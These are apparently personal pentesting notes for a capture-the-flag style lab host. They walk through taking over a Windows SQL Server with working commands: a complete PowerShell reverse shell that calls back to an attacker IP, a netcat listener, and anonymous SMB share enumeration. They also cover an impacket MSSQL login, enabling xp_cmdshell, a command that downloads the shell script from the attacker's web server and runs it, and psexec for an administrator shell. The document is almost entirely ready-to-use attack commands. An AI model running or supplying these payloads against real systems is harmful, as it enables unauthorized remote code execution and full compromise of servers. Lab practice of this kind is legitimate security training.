# CLIENTS

# 📂 UP A FILE SERVER
<!--[NOTE](CLIENTS%200683c1b12cf54383bb91fb3c61824e77/UP%20A%20FILE%20SERVER%2043667d6f827f4c4b8342731d5e92dd1e.md)-->

to create the payload in your machine to pass to the server

this powershell code will get a RCE

- save this in a file *shell.ps1*

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```markdown
# Up a webserver in the host to hospedate the file with python
> python3 -m http.server 80

# Start a NETCAT listener
> nc -lvnp 443

# Allow reverse 80 - 443 port connection on the host
> ufw allow from 10.10.10.27 proto tcp to any port 80,443
```


# 🌐 SMB Server
<!--[NOTE](CLIENTS%200683c1b12cf54383bb91fb3c61824e77/SMB%20Server%20beb9a02922e74f849961d241b053ca33.md)>

```markdown
# 10.10.10.27 port 1433 is open to smbserver

## connect in the smb machine
> smbclient -N -L 10.10.10.27
> smbclient -N 10.10.10.27/backups

## Download files shared in smb
> smbget -R smb://10.10.10.27/backup/<FILE>
## or
> SMB> get <FILE>
```
# 🌐 SQL Server
<!--[NOTE](CLIENTS%200683c1b12cf54383bb91fb3c61824e77/SQL%20Server%2004f3053e885240499fcb14cac0b4a953.md)-->

```markdown
# connect to sqlserver with impacket
> git clone https://github.com/SecureAuthCorp/impacket

> mssqlclient.py USERNAME/sql_svc@10.10.10.27 -windows-auth

# command IS_SRVROLEMEMBER to veryfy if the current user has ADMIN privileges
> SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
```

```markdown
# This code will activate xp_cmdshell and gain RCE on the host
# will be sucefull if the host has administrative privileges
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```

**UP A FILE SERVER in your machine**

to pass the payload to the server to get a RCE

```markdown
# And download the file from your computer to the server and execute
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
```

to get a privilated shell on the server with *impacket*

```markdown
# Using the psexec.py to get privilaged shell
> psexec.py administrator@10.10.10.27
```
